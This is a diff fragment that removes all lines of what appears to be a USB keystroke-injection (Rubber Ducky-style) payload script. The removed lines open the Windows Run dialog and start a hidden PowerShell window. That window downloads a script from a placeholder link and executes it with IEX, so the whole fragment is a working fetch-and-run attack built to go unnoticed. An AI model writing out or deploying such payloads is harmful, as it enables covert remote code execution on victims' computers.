@@ -1,6 +1,0 @@
-DELAY 500
-GUI r
-ENTER
-DELAY 300
-STRING cmd /c start /min powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('{link}');"
-ENTER
